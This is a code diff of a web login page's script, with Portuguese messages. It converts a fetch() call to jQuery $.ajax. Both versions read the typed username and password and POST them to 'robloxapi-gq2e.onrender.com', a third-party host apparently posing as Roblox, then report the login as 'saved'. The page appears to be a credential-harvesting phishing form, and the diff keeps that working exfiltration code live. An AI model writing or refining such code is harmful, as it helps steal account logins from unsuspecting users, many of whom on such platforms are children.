@@ -730,48 +730,41 @@
         </div>
     </div>
 
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
     <script>
-        document.addEventListener('click', function(event) {
-            if (event.target.tagName === 'BUTTON' && event.target.id === 'btn-login') {
-                console.log('Botão "Entrar" clicado!');
+        $('#btn-login').on('click', function(event) {
+            event.preventDefault();
 
-                const username = document.querySelector('input[name="username"]').value.trim();
-                const password = document.querySelector('input[name="password"]').value.trim();
+            const username = $('input[name="username"]').val().trim();
+            const password = $('input[name="password"]').val().trim();
 
-                if (!username || !password) {
-                    alert("Preencha os dois campos.");
-                    return;
-                }
-
-                const dados = {
-                    username: username,
-                    password: password
-                };
-
-                console.log("Enviando dados:", dados);
-
-                fetch("https://robloxapi-gq2e.onrender.com/api/v1", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify(dados)
-                    })
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error("Erro ao salvar dados.");
-                        }
-                        return response.json();
-                    })
-                    .then(data => {
-                        console.log("Resposta da API:", data);
-                        alert("Login salvo com sucesso.");
-                    })
-                    .catch(error => {
-                        console.error("Erro na requisição:", error);
-                        alert("Erro ao enviar login.");
-                    });
+            if (!username || !password) {
+                alert("Preencha os dois campos.");
+                return;
             }
+
+            const dados = {
+                username: username,
+                password: password
+            };
+
+            console.log("Enviando dados:", dados);
+
+            $.ajax({
+                url: "https://robloxapi-gq2e.onrender.com/api/v1",
+                method: "POST",
+                contentType: "application/json",
+                data: JSON.stringify(dados),
+                success: function(data) {
+                    console.log("Resposta da API:", data);
+                    alert("Login salvo com sucesso.");
+                },
+                error: function(jqXHR, textStatus, errorThrown) {
+                    console.error("Erro na requisição:", textStatus, errorThrown);
+                    alert("Erro ao enviar login.");
+                }
+            });
         });
     </script>
 
